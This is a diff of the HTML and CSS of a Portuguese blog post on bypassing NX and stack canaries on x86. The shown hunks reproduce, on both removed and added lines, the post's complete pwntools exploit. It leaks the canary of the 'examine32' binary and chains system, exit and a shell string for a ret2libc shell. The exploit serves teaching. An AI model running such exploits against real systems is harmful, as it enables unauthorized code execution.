@@ -11,23 +11,26 @@
 			max-width: 50em;
 			margin: 0 auto;
 			color: white;
+			background-color: rgb(0,0,0,0.7);
 			line-height: calc(1ex / 0.32);
 			margin-top: 3em;
+			overflow-wrap: break-word;
 		}
 		pre {
 			font-family: 'gohu', monospace;
 			white-space: pre-wrap;
+			overflow-wrap: anywhere;
 			line-height: 125%;
       		background-color: #111;
     	  	padding: 1em;
-		}
-		.bg_black {
-			background-color: rgb(0,0,0,0.7);
 		}
 		@media only screen and (max-width:768px) {
 			body {
 				max-width:100%;
 			}
+		}
+		td {
+			vertical-align: top;
 		}
 		a:link {
 			color: #0a0 ;
@@ -83,7 +86,7 @@
   <meta charset="UTF-8">
 </head>
 
-<body><div class="bg_black"><h1>Bypassando NX e Canary em x86</h1>
+<body><h1>Bypassando NX e Canary em x86</h1>
 <p>1523577600</p>
 <p>Ou “pwning for dummies”</p>
 <p>Mês passado o <a href="https://medium.com/u/ab160d5eb7a4">Fernando Mercês</a> pediu pelo <a href="https://twitter.com/MercesFernando/status/979170684881555457">Twitter</a> que reportássemos bugs em uma ferramenta dele. Como estava estudando <em>pwning,</em> imaginei que procurar por vulnerabilidades nos repositórios dele seria um bom desafio. <em>(</em> ̶<em>s̶o̶r̶r̶y̶ ̶m̶e̶r̶c̶ê̶s̶ )</em></p>
@@ -296,27 +299,27 @@ Segue :</p>
 
 <p>Conseguimos assim ler os valores do Canary, depois temos apenas que montar a stack com o valor dele para não cairmos no <em>__stack_chk_fail.</em></p>
 <p>E o exploit final :</p>
-<div class="codehilite"><pre><span></span><code><span class="w">            </span><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="o">*</span>
+<div class="codehilite"><pre><span></span><code>            <span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
 
-<span class="w">            </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;./examine32&quot;</span><span class="p">)</span>
-<span class="w">            </span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1032</span><span class="w"> </span><span class="c1"># offset para sobrescrever o EIP</span>
-<span class="w">            </span><span class="n">read_canary_payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">1001</span><span class="w"> </span><span class="c1"># sobrescrevendo o nullbyte para leakar o valor do Canary</span>
-<span class="w">            </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">read_canary_payload</span><span class="p">)</span>
-<span class="w">            </span><span class="n">canary</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Timestamp&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;%&quot;</span><span class="p">)</span><span class="w"> </span>
-<span class="w">            </span><span class="n">canary</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">canary</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="o">-</span><span class="mi">2</span><span class="p">:]</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nb">range</span><span class="p">(</span><span class="o">-</span><span class="mi">7</span><span class="p">,</span><span class="mi">0</span><span class="p">)][:</span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="c1"># Lendo o output</span>
-<span class="w">            </span><span class="n">canary</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;0&quot;</span><span class="p">)</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">canary</span><span class="p">]</span><span class="w"> </span><span class="c1"># o zero buga o printf</span>
-<span class="w">            </span><span class="nb">print</span><span class="w"> </span><span class="s2">&quot;[!] Canary found : &quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
-<span class="w">            </span><span class="n">canary</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">int</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">canary</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./examine32&quot;</span><span class="p">)</span>
+            <span class="n">offset</span> <span class="o">=</span> <span class="mi">1032</span> <span class="c1"># offset para sobrescrever o EIP</span>
+            <span class="n">read_canary_payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">1001</span> <span class="c1"># sobrescrevendo o nullbyte para leakar o valor do Canary</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">read_canary_payload</span><span class="p">)</span>
+            <span class="n">canary</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Timestamp&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;%&quot;</span><span class="p">)</span> 
+            <span class="n">canary</span> <span class="o">=</span> <span class="p">[</span><span class="n">canary</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="o">-</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="o">-</span><span class="mi">7</span><span class="p">,</span><span class="mi">0</span><span class="p">)][:</span><span class="mi">3</span><span class="p">]</span> <span class="c1"># Lendo o output</span>
+            <span class="n">canary</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;0&quot;</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">canary</span><span class="p">]</span> <span class="c1"># o zero buga o printf</span>
+            <span class="nb">print</span> <span class="s2">&quot;[!] Canary found : &quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+            <span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">canary</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
 
-<span class="w">            </span><span class="n">system</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xf7e19e70</span>
-<span class="w">            </span><span class="n">exit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xf7e0cf50</span>
-<span class="w">            </span><span class="n">bash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xf7f39fcc</span>
+            <span class="n">system</span> <span class="o">=</span> <span class="mh">0xf7e19e70</span>
+            <span class="n">exit</span> <span class="o">=</span> <span class="mh">0xf7e0cf50</span>
+            <span class="n">bash</span> <span class="o">=</span> <span class="mh">0xf7f39fcc</span>
 
-<span class="w">            </span><span class="n">exploit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">1000</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="w"> </span><span class="c1"># o canary acaba com nullbyte</span>
-<span class="w">            </span><span class="n">exploit</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">exploit</span><span class="p">)))</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">exit</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">bash</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\xff</span><span class="s2">&quot;</span><span class="w"> </span><span class="c1"># 0xff = EOF</span>
-<span class="w">            </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
-<span class="w">            </span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span><span class="w"> </span><span class="c1"># g0t sh3ll ?</span>
+            <span class="n">exploit</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">1000</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="c1"># o canary acaba com nullbyte</span>
+            <span class="n">exploit</span> <span class="o">+=</span> <span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">exploit</span><span class="p">)))</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">exit</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">bash</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\xff</span><span class="s2">&quot;</span> <span class="c1"># 0xff = EOF</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1"># g0t sh3ll ?</span>
 </code></pre></div>
 
 <p>Como em x64 os argumentos ficam nos registradores, precisaremos fazer mais coisa antes de chamar o <em>system,</em> esse será o tópico do próximo post.</p>
-<p>Inté !</p></body><hr>by <a href='https://twitter.com/caioluders'>@caioluders</a></div></html>
+<p>Inté !</p></body><hr>by <a href='https://twitter.com/caioluders'>@caioluders</a></html>
